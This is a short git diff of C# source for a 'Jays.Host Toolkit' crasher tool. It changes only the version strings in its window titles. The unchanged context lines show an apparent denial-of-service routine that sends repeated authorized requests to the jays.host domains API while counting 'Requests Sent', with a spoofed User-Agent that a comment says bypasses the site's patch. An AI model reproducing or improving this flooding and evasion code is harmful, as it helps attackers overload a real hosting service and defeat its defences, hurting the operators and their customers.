@@ -18,7 +18,7 @@ namespace Jays.Host_Toolkit.Tools.Crashers
             tryAgain:
             try
             {
-                Title = "Jays.Host Toolkit | Made by Verity | Version 1.0, Build 01/20/22 | Current Tool: Method 3";
+                Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: Method 3";
             
                 Utils.LoadingSequence();
             
@@ -58,7 +58,7 @@ namespace Jays.Host_Toolkit.Tools.Crashers
             {
                 try
                 {
-                    Title = "Jays.Host Toolkit | Made by Verity | Version 1.0, Build 01/20/22 | Current Tool: Method 3 | Requests Sent: " + _requestsSent;
+                    Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: Method 3 | Requests Sent: " + _requestsSent;
                     var pageEndpoint = WebRequest.Create("https://jays.host/api/v1/domains/all/1");
                     pageEndpoint.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win69; x64; rv:47.0) Gecko/20100101 Firefox/47.0"); // Bypass Jays awesome patch.
                     pageEndpoint.Headers.Add("Authorization", _token);
